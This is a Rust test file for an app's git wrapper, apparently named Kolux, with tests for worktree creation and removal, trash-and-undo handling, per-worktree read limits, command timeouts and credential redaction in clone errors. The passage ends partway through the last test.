//! Tests for `git.rs`, moved out unchanged (c2-agents audit: git.rs split along its test seam).

use super::*;
use std::fs;

#[test]
fn an_unattended_git_fails_fast_on_a_remote_that_wants_a_password() {
    use std::io::{Read, Write};
    // A remote that answers every request with "who are you?" and nothing else.
    let server = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = server.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for mut conn in server.incoming().flatten().take(8) {
            let mut buf = [0u8; 4096];
            let _ = conn.read(&mut buf);
            let _ = conn.write_all(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"private\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
        }
    });
    // Only NO_PROMPT is under test: a config pair or password helper the parent shell injected
    // (credential.interactive, GIT_ASKPASS) would change git's words, so they are left out.
    ISOLATED.with(|i| i.set(true));
    let url = format!("http://127.0.0.1:{port}/private.git");
    let mut cmd = command(&["-c", "credential.helper=", "ls-remote", &url], None);
    cmd.envs(NO_PROMPT).stdin(std::process::Stdio::null()).stdout(std::process::Stdio::null()).stderr(std::process::Stdio::piped());
    // T-700 (K2): the clock covers git alone, from its start to its exit. A prompt never returns, so the
    // watchdog only has to tell "waiting for an answer" from "slow": a busy CI runner once took git past
    // 30 s to fail as it should. "Terminal prompts disabled" below is the proof that git asked nobody.
    let began = std::time::Instant::now();
    let mut child = cmd.spawn().unwrap();
    while child.try_wait().unwrap().is_none() {
        if began.elapsed() > std::time::Duration::from_secs(90) {
            let _ = child.kill();
            panic!("git still waiting after 90 s, as a password prompt would");
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
    let out = child.wait_with_output().unwrap();
    let said = String::from_utf8_lossy(&out.stderr).to_lowercase();
    assert!(!out.status.success());
    assert!(said.contains("terminal prompts disabled"), "{said}");
}

#[test]
fn git038_base_entries_list_every_difference_from_the_snapshot_and_the_sides_read_against_it() {
    let dir = temp_repo("base");
    run(&["config", "core.autocrlf", "false"], Some(&dir)).unwrap();
    fs::write(dir.join("a.txt"), "one\ntwo\n").unwrap();
    run(&["add", "."], Some(&dir)).unwrap();
    run(&["commit", "-q", "-m", "a"], Some(&dir)).unwrap();
    let since = run(&["rev-parse", "HEAD"], Some(&dir)).unwrap().trim().to_string();
    // A committed change, a working-tree change, a new untracked file, a deletion.
    fs::write(dir.join("a.txt"), "one\ntwo\nthree\n").unwrap();
    run(&["commit", "-q", "-am", "a again"], Some(&dir)).unwrap();
    fs::write(dir.join("README.md"), "hello\nworld\n").unwrap();
    fs::write(dir.join("new.txt"), "fresh").unwrap();
    let entries = base_entries(&dir, &since).unwrap();
    let rel = |e: &Entry| Path::new(&e.path).strip_prefix(&dir).unwrap().to_string_lossy().replace('\\', "/");
    let got: Vec<(String, char, Option<u64>, bool)> = entries.iter().map(|e| (rel(e), e.code, e.lines, e.staged)).collect();
    assert_eq!(got, vec![("README.md".to_string(), 'M', Some(1), false), ("a.txt".to_string(), 'M', Some(1), false), ("new.txt".to_string(), '?', Some(1), false)]);
    assert!(entries[0].stamp.starts_with(&format!("{since}:")), "{}", entries[0].stamp);
    assert_eq!(base_sides(&dir.join("README.md"), &since).unwrap(), ("hello\n".to_string(), "hello\nworld\n".to_string()));
    assert_eq!(base_sides(&dir.join("new.txt"), &since).unwrap(), (String::new(), "fresh".to_string()));
    fs::remove_file(dir.join("a.txt")).unwrap();
    let entries = base_entries(&dir, &since).unwrap();
    assert_eq!(entries.iter().map(|e| (rel(e), e.code)).collect::<Vec<_>>(), vec![("README.md".to_string(), 'M'), ("a.txt".to_string(), 'D'), ("new.txt".to_string(), '?')]);
    assert_eq!(base_sides(&dir.join("a.txt"), &since).unwrap(), ("one\ntwo\n".to_string(), String::new()));
    let _ = fs::remove_dir_all(&dir);
}

fn temp_repo(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("kolux-git-{name}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&dir);
    fs::create_dir_all(&dir).unwrap();
    run(&["init", "-q", "-b", "main"], Some(&dir)).unwrap();
    run(&["config", "user.email", "test@example.com"], Some(&dir)).unwrap();
    run(&["config", "user.name", "Kolux test"], Some(&dir)).unwrap();
    fs::write(dir.join("README.md"), "hello\n").unwrap();
    run(&["add", "."], Some(&dir)).unwrap();
    run(&["commit", "-q", "-m", "first"], Some(&dir)).unwrap();
    dir
}

#[test]
fn cli018_only_commands_that_change_the_worktree_list_count_as_a_change() {
    let counts = |args: &[&str]| WorktreeChange::watch(args).0;
    for args in [&["worktree", "add", "-b", "x", "d", "main"][..], &["-c", "gc.auto=0", "worktree", "remove", "d"], &["worktree", "move", "a", "b"], &["worktree", "prune"], &["worktree", "repair"], &["-C", "worktree", "worktree", "add", "d"]] {
        assert!(counts(args), "{args:?}");
    }
    for args in [&["worktree", "list", "--porcelain"][..], &["status"], &["branch", "-D", "worktree"], &["worktree"], &[], &["commit", "-m", "worktree", "add"], &["-C", "worktree", "status"]] {
        assert!(!counts(args), "{args:?}");
    }
}

#[test]
fn cli018_adding_then_removing_a_worktree_counts_as_two_changes() {
    let git = Git::detect().unwrap();
    let repo = temp_repo("wt-count");
    let dest = std::env::temp_dir().join(format!("kolux-git-wt-count-ws-{}", std::process::id())).join("c");
    let _ = fs::remove_dir_all(dest.parent().unwrap());
    let mine = || THIS_THREAD_CHANGES.with(|c| c.get());
    let before = mine();
    git.worktree_add(&repo, &dest, "c", "HEAD").unwrap();
    assert_eq!(mine() - before, 1, "add");
    git.worktree_remove(&repo, &dest, Some("c")).unwrap();
    assert_eq!(mine() - before, 2, "remove, whose normal path runs no git worktree command");
    let _ = fs::remove_dir_all(dest.parent().unwrap());
}

#[test]
fn git070_only_short_reads_take_a_turn_and_long_running_commands_are_exempt() {
    for args in [&["status", "--porcelain=v2"][..], &["-c", "core.quotepath=off", "diff", "--numstat"], &["-C", "x", "log", "-1"], &["rev-parse", "HEAD"], &["worktree", "list", "--porcelain"], &["for-each-ref"]] {
        assert!(short_read(args), "{args:?}");
    }
    for args in [&["worktree", "add", "-b", "x", "d", "main"][..], &["fetch", "origin"], &["clone", "u", "d"], &["push", "-u", "origin", "x"], &["pull"], &["commit", "-m", "x"], &["-c", "alias.x=!sleep 1", "x"], &["--version"], &["worktree", "remove", "d"], &[]] {
        assert!(!short_read(args), "{args:?}");
    }
}

#[test]
fn git070_turns_are_per_worktree_and_exempt_commands_never_wait() {
    ISOLATED.with(|i| i.set(true));
    let (a, b) = (temp_repo("git070-a"), temp_repo("git070-b"));
    static L: Limiter = Limiter::new(1);
    let held = L.enter(&a, false);
    // A short read on the busy worktree waits for its turn...
    let (tx, rx) = std::sync::mpsc::channel();
    let a2 = a.clone();
    let waiter = std::thread::spawn(move || {
        ISOLATED.with(|i| i.set(true));
        let _ = tx.send(gated(&["rev-parse", "HEAD"], Some(&a2), &L, SHORT_READ_LIMIT));
    });
    assert!(rx.recv_timeout(std::time::Duration::from_millis(400)).is_err(), "a short read waited for the worktree's turn");
    // ...while another worktree's short read does not (no app-wide cap)...
    assert!(gated(&["rev-parse", "HEAD"], Some(&b), &L, SHORT_READ_LIMIT).is_ok());
    // ...and fetch and worktree add on the busy worktree run at once, with no turn taken.
    assert!(gated(&["fetch", "-q", "."], Some(&a), &L, SHORT_READ_LIMIT).is_ok());
    let wt = a.with_file_name(format!("{}-wt", a.file_name().unwrap().to_string_lossy()));
    let _ = fs::remove_dir_all(&wt);
    assert!(gated(&["worktree", "add", "-q", "-b", "side", &wt.to_string_lossy(), "main"], Some(&a), &L, SHORT_READ_LIMIT).is_ok());
    assert_eq!(L.running(&a), 1, "only the held turn is counted");
    drop(held);
    assert!(rx.recv_timeout(std::time::Duration::from_secs(30)).unwrap().is_ok(), "the waiting read ran once the turn was free");
    waiter.join().unwrap();
    assert_eq!(L.running(&a), 0);
    for d in [&wt, &a, &b] {
        let _ = fs::remove_dir_all(d);
    }
}

#[test]
fn git070_waiting_foreground_reads_go_before_waiting_background_reads_on_one_worktree() {
    static L: Limiter = Limiter::new(1);
    let dir = Path::new("git070-order");
    let order = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let held = L.enter(dir, false);
    let wait = |fg: bool, name: &'static str| {
        let order = order.clone();
        std::thread::spawn(move || {
            let _t = L.enter(dir, fg);
            order.lock().unwrap().push(name);
        })
    };
    let bg = wait(false, "background");
    std::thread::sleep(std::time::Duration::from_millis(150));
    let fg = wait(true, "foreground");
    std::thread::sleep(std::time::Duration::from_millis(150));
    drop(held);
    bg.join().unwrap();
    fg.join().unwrap();
    assert_eq!(*order.lock().unwrap(), ["foreground", "background"]);
    assert_eq!(L.running(dir), 0);
}

#[test]
fn git070_a_hung_short_read_is_stopped_at_its_limit_and_the_next_read_runs() {
    ISOLATED.with(|i| i.set(true));
    let dir = temp_repo("git070-hang");
    fs::write(dir.join("README.md"), "changed\n").unwrap();
    static L: Limiter = Limiter::new(4);
    let started = std::time::Instant::now();
    // diff hands each changed file to an external tool that never ends.
    let err = gated(&["-c", "diff.external=sleep 20;:", "diff", "--ext-diff"], Some(&dir), &L, std::time::Duration::from_millis(600)).unwrap_err();
    assert!(started.elapsed() < std::time::Duration::from_secs(10), "stopped at the limit: {:?}", started.elapsed());
    assert!(err.contains("did not finish"), "{err}");
    assert_eq!(L.running(&dir), 0, "the turn is given back");
    assert!(gated(&["diff", "--name-only"], Some(&dir), &L, SHORT_READ_LIMIT).unwrap().starts_with(b"README.md"));
    let _ = fs::remove_dir_all(&dir);
}

#[cfg(windows)]
#[test]
fn git070_long_windows_paths_are_switched_on_without_changing_the_command_line() {
    let cmd = command(&["status"], None);
    let env: Vec<_> = cmd.get_envs().filter_map(|(k, v)| Some((k.to_string_lossy().into_owned(), v?.to_string_lossy().into_owned()))).collect();
    // T-779: the slot number follows the user's own pairs (and core.fsmonitor takes the first of
    // ours), so what matters is a key slot naming core.longpaths with "true" in the same slot.
    let slot = env.iter().find(|(k, v)| k.starts_with("GIT_CONFIG_KEY_") && v == "core.longpaths").map(|(k, _)| k["GIT_CONFIG_KEY_".len()..].to_string());
    let slot = slot.unwrap_or_else(|| panic!("no core.longpaths slot: {env:?}"));
    assert!(env.contains(&(format!("GIT_CONFIG_VALUE_{slot}"), "true".into())), "{env:?}");
    let count: usize = env.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.parse().unwrap()).unwrap();
    assert!(slot.parse::<usize>().unwrap() < count, "the slot is inside the count: {env:?}");
    assert_eq!(cmd.get_args().collect::<Vec<_>>(), ["status"]);
}

#[test]
fn proj027_the_add_wait_defaults_to_three_minutes_and_the_override_is_clamped() {
    let min = std::time::Duration::from_secs(180);
    assert_eq!(add_timeout(None), min);
    assert_eq!(add_timeout(Some("nonsense")), min);
    assert_eq!(add_timeout(Some("1000")), min, "below the floor");
    assert_eq!(add_timeout(Some("600000")), std::time::Duration::from_secs(600));
    assert_eq!(add_timeout(Some(" 600000 ")), std::time::Duration::from_secs(600));
    assert_eq!(add_timeout(Some("99999999")), std::time::Duration::from_secs(1800), "above the ceiling");
}

#[test]
fn proj027_a_git_that_stalls_is_stopped_with_a_message_naming_the_wait_and_the_cause() {
    ISOLATED.with(|i| i.set(true));
    let dir = temp_repo("proj027-stall");
    let started = std::time::Instant::now();
    let err = run_within(&["-c", "alias.stall=!sleep 20", "stall"], Some(&dir), std::time::Duration::from_millis(400)).unwrap_err();
    assert!(started.elapsed() < std::time::Duration::from_secs(10), "stopped at the limit, not at the end of the stall");
    assert!(err.contains("did not finish") && err.contains("cloud service"), "{err}");
    // A quick git still answers, with output trimmed; a failing one carries its stderr.
    assert_eq!(run_within(&["rev-parse", "--abbrev-ref", "HEAD"], Some(&dir), std::time::Duration::from_secs(30)).unwrap(), "main");
    assert!(run_within(&["rev-parse", "--verify", "nope"], Some(&dir), std::time::Duration::from_secs(30)).is_err());
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn t315_a_failed_clone_comes_down_to_its_last_fatal_line_without_progress() {
    // A real clone into a folder that exists and is not empty.
    ISOLATED.with(|i| i.set(true));
    let src = temp_repo("t315-src");
    let dest = std::env::temp_dir().join(format!("kolux-git-t315-dest-{}", std::process::id()));
    let _ = fs::remove_dir_all(&dest);
    fs::create_dir_all(&dest).unwrap();
    fs::write(dest.join("keep.txt"), "mine\n").unwrap();
    let out = command(&["clone", "--progress", "--", &native(&src.to_string_lossy()), &native(&dest.to_string_lossy())], None).output().unwrap();
    assert!(!out.status.success());
    let reason = failure_reason(&String::from_utf8_lossy(&out.stderr)).unwrap();
    assert!(reason.starts_with("Destination path") && reason.contains("already exists"), "{reason}");
    // A clone that fails part-way: progress (with \r redraws) and trailing fragments never show.
    let log = "Cloning into 'x'...\nremote: Enumerating objects: 5, done.\nReceiving objects:  10% (1/9)\rReceiving objects:  40% (4/9)\nerror: RPC failed; curl 56 recv failure\nfatal: early EOF\nfatal: fetch-pack: invalid index-pack output\nremote: \n";
    assert_eq!(failure_reason(log).as_deref(), Some("Fetch-pack: invalid index-pack output"));
    assert_eq!(failure_reason("error: cannot lock ref\nReceiving objects: 100%").as_deref(), Some("Cannot lock ref"));
    assert_eq!(failure_reason("warning: could not find UI helper\n").as_deref(), Some("Warning: could not find UI helper"));
    assert_eq!(failure_reason("Cloning into 'x'...\nReceiving objects:  3%\r"), None);
    let _ = fs::remove_dir_all(&src);
    let _ = fs::remove_dir_all(&dest);
}

/// FIX-2 AFTER 3: the reason never shows a password or token that was in the link, and a
/// line git ended with a bare \r still counts.
#[test]
fn fix2_a_clone_reason_hides_the_link_password_and_keeps_a_last_redrawn_line() {
    let log = "Cloning into 'x'...\nfatal: unable to access 'https://me:ghp_secret123@github.com/o/r.git/': The requested URL returned error: 403\n";
    let reason = failure_reason(log).unwrap();
    assert!(!reason.contains("ghp_secret123") && !reason.contains("me:"), "{reason}");
    assert!(reason.contains("https://***@github.com/o/r.git/"), "{reason}");
    assert_eq!(failure_reason("Receiving objects:  3%\rfatal: repository not found\r").as_deref(), Some("Repository not found"));
    assert_eq!(failure_reason("fatal: gone\r\n").as_deref(), Some("Gone"));
}

#[test]
fn merge_predictions_need_git_2_38() {
    let g = |v: &str| Git { version: v.into() }.predicts_merges();
    assert!(!g("git version 2.37.1") && !g("git version 1.9.5.msysgit.1"));
    assert!(g("git version 2.38.0") && g("git version 2.55.0.windows.3") && g("git version 3.0.0"));
    // A version that cannot be read is tried; merge-tree itself then says whether it can.
    assert!(g("something else"));
}

#[test]
fn detects_git_and_rejects_plain_folders() {
    let git = Git::detect().unwrap();
    assert!(git.version.starts_with("git version"));
    let plain = std::env::temp_dir().join(format!("kolux-plain-{}", std::process::id()));
    fs::create_dir_all(&plain).unwrap();
    let err = git.toplevel(&plain).unwrap_err();
    assert!(err.contains("not inside a Git repository"), "{err}");
    assert!(git.toplevel(&plain.join("missing")).unwrap_err().contains("not a folder"));
    fs::remove_dir_all(&plain).unwrap();
}

#[test]
fn worktree_add_then_remove_round_trip() {
    let git = Git::detect().unwrap();
    let repo = temp_repo("wt");
    fs::create_dir_all(repo.join("src")).unwrap();
    let top = git.toplevel(&repo.join("src")).unwrap();
    assert_eq!(top.canonicalize().unwrap(), repo.canonicalize().unwrap(), "a subfolder resolves to the repository root");
    assert_eq!(git.toplevel(&repo.join(".git")).unwrap().canonicalize().unwrap(), repo.canonicalize().unwrap(), "the .git folder itself means the repository");

    let before = git.worktrees(&repo).unwrap();
    assert_eq!(before.len(), 1);
    assert!(before[0].is_main);
    assert_eq!(before[0].branch.as_deref(), Some("main"));

    let dest = std::env::temp_dir().join(format!("kolux-git-wt-ws-{}", std::process::id())).join("fix-login");
    let _ = fs::remove_dir_all(dest.parent().unwrap());
    git.worktree_add(&repo, &dest, "fix-login", "HEAD").unwrap();
    assert!(dest.join("README.md").is_file(), "worktree folder has the files");
    assert!(git.branch_taken(&repo, "fix-login"));
    let list = git.worktrees(&repo).unwrap();
    assert_eq!(list.len(), 2);
    let added = list.iter().find(|w| !w.is_main).unwrap();
    assert_eq!(added.branch.as_deref(), Some("fix-login"));
    assert_eq!(PathBuf::from(&added.path).canonicalize().unwrap(), dest.canonicalize().unwrap());

    assert_eq!(git.worktree_remove(&repo, &dest, Some("fix-login")).unwrap(), None);
    assert!(!dest.exists(), "folder is gone");
    assert!(!git.branch_taken(&repo, "fix-login"), "branch is gone");
    assert_eq!(git.worktrees(&repo).unwrap().len(), 1);

    fs::remove_dir_all(dest.parent().unwrap()).unwrap();
    fs::remove_dir_all(&repo).unwrap();
}

#[test]
fn proj074_a_deleted_workspace_goes_through_a_hidden_trash_and_can_be_moved_back() {
    let base = std::env::temp_dir().join(format!("kolux-git-trash-{}", std::process::id()));
    let _ = fs::remove_dir_all(&base);
    let dest = base.join("big");
    fs::create_dir_all(dest.join("deep/er")).unwrap();
    fs::write(dest.join("deep/er/f.txt"), "x").unwrap();
    let trash = move_to_trash(&dest).unwrap();
    assert!(!dest.exists(), "the folder is gone from its place at once");
    let name = trash.file_name().unwrap().to_string_lossy().into_owned();
    assert!(trash.join("deep/er/f.txt").is_file() && trash.parent() == Some(base.as_path()) && is_trash_name(&name) && name.ends_with("-big"), "{name}");
    // the removal is undone: the folder goes back to where Git expects it
    move_back(&trash, &dest).unwrap();
    assert!(dest.join("deep/er/f.txt").is_file() && !trash.exists());
    // and the second time it is deleted off the caller's thread
    let trash = move_to_trash(&dest).unwrap();
    assert!(spawn_empty_trash(trash.clone()).join().unwrap());
    assert!(!trash.exists() && !dest.exists());
    let _ = fs::remove_dir_all(&base);
}

#[test]
fn row128_a_trash_folder_whose_move_back_failed_is_kept_by_the_launch_sweep() {
    let base = std::env::temp_dir().join(format!("kolux-git-r128-{}", std::process::id()));
    let _ = fs::remove_dir_all(&base);
    let dest = base.join("work");
    fs::create_dir_all(&dest).unwrap();
    fs::write(dest.join("notes.txt"), "work the user still needs").unwrap();
    let trash = move_to_trash(&dest).unwrap();
    // something took the folder's place meanwhile, so moving it back fails
    fs::create_dir_all(dest.join("other")).unwrap();
    let err = move_back(&trash, &dest).unwrap_err();
    let _ = sweep_trash(&base);
    assert!(trash.join("notes.txt").is_file(), "the launch sweep must never delete a folder whose move back failed");
    assert!(err.contains(&trash.display().to_string()), "the error says where the folder is kept: {err}");
    let _ = fs::remove_dir_all(&base);
}

#[test]
fn proj074_the_sweep_clears_confirmed_trash_of_the_exact_shape_and_nothing_else() {
    let base = std::env::temp_dir().join(format!("kolux-git-sweep-{}", std::process::id()));
    let _ = fs::remove_dir_all(&base);
    // row 130: only `.kolux-trash-<hex>-<hex>-<name>` counts; the old forms are left alone
    for dir in [".kolux-trash-1a-2b-otter", ".kolux-trash-1a-2c-work", ".kolux-trash-otter", "otter.kolux-trash", ".kolux-trash-zz-2b-otter", ".kolux-trash-1a-2b-", "otter", ".kolux-trash-", ".git", "trash", "keep.kolux-trash-x"] {
        fs::create_dir_all(base.join(dir)).unwrap();
        fs::write(base.join(dir).join("f.txt"), "x").unwrap();
    }
    confirm_trash(&base.join(".kolux-trash-1a-2b-otter"));
    fs::write(base.join(".kolux-trash-1a-2b-file"), "a file with a trash name is not a folder").unwrap();
    let swept = sweep_trash(&base);
    let names = |v: &[PathBuf]| v.iter().map(|p| p.file_name().unwrap().to_string_lossy().into_owned()).collect::<Vec<_>>();
    assert_eq!(names(&swept.gone), vec![".kolux-trash-1a-2b-otter"]);
    // row 128: a trash folder whose removal was never confirmed is kept and reported
    assert_eq!(names(&swept.kept), vec![".kolux-trash-1a-2c-work"]);
    for kept in [".kolux-trash-1a-2c-work", ".kolux-trash-otter", "otter.kolux-trash", ".kolux-trash-zz-2b-otter", ".kolux-trash-1a-2b-", "otter", ".kolux-trash-", ".git", "trash", "keep.kolux-trash-x", ".kolux-trash-1a-2b-file"] {
        assert!(base.join(kept).exists(), "{kept} must stay");
    }
    assert!(sweep_trash(&base.join("no-such-folder")).gone.is_empty());
    let _ = fs::remove_dir_all(&base);
}

#[test]
fn row128_a_confirmed_delete_cut_short_keeps_its_mark_until_the_last_file_goes() {
    let base = std::env::temp_dir().join(format!("kolux-git-r128c-{}", std::process::id()));
    let _ = fs::remove_dir_all(&base);
    let trash = base.join(".kolux-trash-1-2-big");
    fs::create_dir_all(trash.join("deep")).unwrap();
    fs::write(trash.join("deep/f.txt"), "x").unwrap();
    confirm_trash(&trash);
    assert!(clear_confirmed_last(&trash) && !trash.exists());
    let _ = fs::remove_dir_all(&base);
}

#[test]
fn row127_undoing_a_removal_puts_back_the_folder_and_gits_record_whole() {
    let git = Git::detect().unwrap();
    let repo = temp_repo("r127");
    let dest = std::env::temp_dir().join(format!("kolux-git-r127-ws-{}", std::process::id())).join("undo-me");
    let _ = fs::remove_dir_all(dest.parent().unwrap());
    git.worktree_add(&repo, &dest, "undo-me", "HEAD").unwrap();
    fs::write(dest.join("work.txt"), "uncommitted work").unwrap();
    let dest_s = dest.to_string_lossy().into_owned();
    // the removal's first half: folder to the trash, Git's record set aside
    let trash = move_to_trash(&dest).unwrap();
    let record = crate::projects::set_aside_record(&repo, &dest_s).unwrap();
    assert_eq!(git.worktrees(&repo).unwrap().len(), 1, "Git no longer lists it");
    // the undo
    record.restore().unwrap();
    move_back(&trash, &dest).unwrap();
    assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git lists it again");
    assert!(git.dirty(&dest).unwrap(), "Git reads the restored workspace and its uncommitted file");
    assert!(dest.join("work.txt").is_file());
    // and a confirmed removal leaves nothing set aside
    git.worktree_remove(&repo, &dest, Some("undo-me")).unwrap();
    let common = repo.join(".git");
    assert!(!common.join("kolux-set-aside").exists(), "nothing left set aside once the removal is confirmed");
    let _ = fs::remove_dir_all(dest.parent().unwrap());
    let _ = fs::remove_dir_all(&repo);
}

#[test]
fn row110_removing_a_locked_worktree_leaves_folder_and_record_in_place() {
    let git = Git::detect().unwrap();
    let repo = temp_repo("r110");
    let dest = std::env::temp_dir().join(format!("kolux-git-r110-ws-{}", std::process::id())).join("on-usb");
    let _ = fs::remove_dir_all(dest.parent().unwrap());
    git.worktree_add(&repo, &dest, "on-usb", "HEAD").unwrap();
    fs::write(dest.join("work.txt"), "work").unwrap();
    run(&["worktree", "lock", &dest.to_string_lossy()], Some(&repo)).unwrap();
    assert!(git.worktree_remove(&repo, &dest, Some("on-usb")).is_err(), "a locked worktree is refused");
    assert!(dest.join("work.txt").is_file(), "its folder is back in place");
    assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git still lists it");
    let left: Vec<String> = fs::read_dir(dest.parent().unwrap()).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
    assert_eq!(left, vec!["on-usb".to_string()], "no trash folder left behind");
    run(&["worktree", "unlock", &dest.to_string_lossy()], Some(&repo)).unwrap();
    let _ = git.worktree_remove(&repo, &dest, Some("on-usb"));
    let _ = fs::remove_dir_all(dest.parent().unwrap());
    let _ = fs::remove_dir_all(&repo);
}

// Windows only: a handle opened with no share mode is what stops a rename or delete under it.
#[cfg(windows)]
#[test]
fn row110_a_file_held_open_by_another_program_stops_the_removal_with_everything_still_there() {
    use std::os::windows::fs::OpenOptionsExt;
    let git = Git::detect().unwrap();
    let repo = temp_repo("r110h");
    let dest = std::env::temp_dir().join(format!("kolux-git-r110h-ws-{}", std::process::id())).join("held");
    let _ = fs::remove_dir_all(dest.parent().unwrap());
    git.worktree_add(&repo, &dest, "held", "HEAD").unwrap();
    fs::create_dir_all(dest.join("a/b")).unwrap();
    let files = ["work.txt", "a/one.txt", "a/b/two.txt", "a/b/held.txt", "a/b/three.txt"];
    for f in files {
        fs::write(dest.join(f), "uncommitted work").unwrap();
    }
    let holder = fs::OpenOptions::new().read(true).write(true).share_mode(0).open(dest.join("a/b/held.txt")).unwrap();
    let outcome = git.worktree_remove(&repo, &dest, Some("held"));
    drop(holder);
    let err = outcome.unwrap_err();
    assert!(err.contains("nothing was deleted"), "the refusal says nothing was touched: {err}");
    for f in files {
        assert!(dest.join(f).is_file(), "{f} must still be there: nothing is deleted piecemeal");
    }
    assert_eq!(git.worktrees(&repo).unwrap().len(), 2, "Git still lists it");
    assert!(git.dirty(&dest).unwrap(), "the folder is still a workspace Git can read");
    let left: Vec<String> = fs::read_dir(dest.parent().unwrap()).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
    assert_eq!(left, vec!["held".to_string()], "no trash folder left behind");
    git.worktree_remove(&repo, &dest, Some("held")).unwrap();
    assert!(!dest.exists(), "once the program lets go, the removal goes through");
    let _ = fs::remove_dir_all(dest.parent().unwrap());
    let _ = fs::remove_dir_all(&repo);
}

#[test]
fn row129_a_kept_branch_is_deleted_only_while_it_still_points_where_it_did() {
    let repo = temp_repo("r129");
    run(&["branch", "kept"], Some(&repo)).unwrap();
    let old = run(&["rev-parse", "refs/heads/kept"], Some(&repo)).unwrap();
    // the branch moves on after the check: the compare-and-delete refuses it
    fs::write(repo.join("more.txt"), "more").unwrap();
    run(&["add", "."], Some(&repo)).unwrap();
    run(&["-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "-m", "more"], Some(&repo)).unwrap();
    let new = run(&["rev-parse", "HEAD"], Some(&repo)).unwrap();
    run(&["update-ref", "refs/heads/kept", &new], Some(&repo)).unwrap();
    assert_eq!(delete_ref_if_at(&repo, "kept", &old), Ok(false));
    assert_eq!(run(&["rev-parse", "refs/heads/kept"], Some(&repo)).unwrap(), new, "a moved branch stays");
    assert_eq!(delete_ref_if_at(&repo, "kept", "--all"), Ok(false), "an option-like commit never reaches Git");
    assert_eq!(delete_ref_if_at(&repo, "kept", &new), Ok(true));
    assert!(run(&["rev-parse", "--verify", "--quiet", "refs/heads/kept"], Some(&repo)).is_err(), "deleted while it pointed where it did");
    let _ = fs::remove_dir_all(&repo);
}

#[test]
fn proj074_removing_a_worktree_leaves_no_trash_and_the_row_is_gone_from_gits_list() {
    let git = Git::detect().unwrap();
    let base = std::env::temp_dir().join(format!("kolux-git-trash-wt-{}", std::process::id()));
    let _ = fs::remove_dir_all(&base);
    let repo = base.join("r");
    fs::create_dir_all(&repo).unwrap();
    let g = |args: &[&str], dir: &Path| {
        let out = command_checked(args, Some(dir)).unwrap().output().unwrap();
        assert!(out.status.success(), "{args:?}: {}", String::from_utf8_lossy(&out.stderr));
    };
    g(&["init", "-q", "-b", "main"], &repo);
    fs::write(repo.join("a.txt"), "a").unwrap();
    g(&["add", "."], &repo);
    g(&["-c", "user.email=t@example.com", "-c", "user.name=t", "commit", "-q", "-m", "first"], &repo);
    let dest = base.join("ws").join("big");
    git.worktree_add(&repo, &dest, "big", "HEAD").unwrap();
    fs::write(dest.join("big.bin"), vec![7u8; 100_000]).unwrap();
    git.worktree_remove(&repo, &dest, Some("big")).unwrap();
    assert!(!dest.exists());
    assert_eq!(git.worktrees(&repo).unwrap().len(), 1);
    let left: Vec<String> = fs::read_dir(base.join("ws")).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).collect();
    assert!(left.is_empty(), "no trash folder is left behind: {left:?}");
    let _ = fs::remove_dir_all(&base);
}

#[test]
fn markdown_files_skip_ignored_ones_and_stop_at_the_cap() {
    let git = Git::detect().unwrap();
    let repo = temp_repo("md");
    fs::create_dir_all(repo.join("docs")).unwrap();
    fs::create_dir_all(repo.join("build")).unwrap();
    fs::write(repo.join("docs").join("guide.md"), "x").unwrap();
    fs::write(repo.join("build").join("out.md"), "x").unwrap();
    fs::write(repo.join("notes.txt"), "x").unwrap();
    fs::write(repo.join(".gitignore"), "build/\n").unwrap();
    let (files, capped) = git.markdown_files(&repo, 10).unwrap();
    let names: Vec<String> = files.iter().map(|f| PathBuf::from(f).strip_prefix(&repo).unwrap().to_string_lossy().replace('\\', "/")).collect();
    assert_eq!(names, ["README.md", "docs/guide.md"]);
    assert!(!capped);
    let (one, capped) = git.markdown_files(&repo, 1).unwrap();
    assert_eq!((one.len(), capped), (1, true));
    fs::remove_dir_all(&repo).unwrap();
}

#[test]
fn changes_list_both_sides_and_diff_sides_read_head_index_and_disk() {
    let git = Git::detect().unwrap();
    let repo = temp_repo("diff");
    run(&["config", "core.autocrlf", "false"], Some(&repo)).unwrap(); // the line ends as written
    fs::write(repo.join("README.md"), "hello staged\n").unwrap();
    run(&["add", "README.md"], Some(&repo)).unwrap();
    fs::write(repo.join("README.md"), "hello staged and more\n").unwrap();
    fs::write(repo.join("new.txt"), "fresh\n").unwrap();
    let rel = |c: &Change| (PathBuf::from(&c.path).strip_prefix(&repo).unwrap().to_string_lossy().into_owned(), c.staged, c.code);
    let list: Vec<_> = git.changes(&repo).unwrap().iter().map(rel).collect();
    assert_eq!(list, [("README.md".into(), true, 'M'), ("README.md".into(), false, 'M'), ("new.txt".into(), false, '?')]);
    let readme = repo.join("README.md");
    assert_eq!(git.diff_sides(&readme, true).unwrap(), ("hello\n".into(), "hello staged\n".into()));
    assert_eq!(git.diff_sides(&readme, false).unwrap(), ("hello staged\n".into(), "hello staged and more\n".into()));
    assert_eq!(git.diff_sides(&repo.join("new.txt"), false).unwrap(), (String::new(), "fresh\n".into()));

    fs::write(repo.join("blob.bin"), [0u8, 1, 2, 0]).unwrap();
    let sizes = |git: &Git| git.change_entries(&repo).unwrap().into_iter().map(|e| (e.lines, e.binary, e.stamp)).collect::<Vec<_>>();
    let before = sizes(&git);
    assert_eq!(before.iter().map(|(l, b, _)| (*l, *b)).collect::<Vec<_>>(), [(Some(2), false), (Some(2), false), (None, true), (Some(1), false)]);
    assert!(before.iter().all(|(_, _, s)| !s.is_empty()), "every change has an identity");
    fs::write(repo.join("README.md"), "hello staged and more, again\n").unwrap();
    let after = sizes(&git);
    assert_eq!(after[0].2, before[0].2, "the staged change is the same");
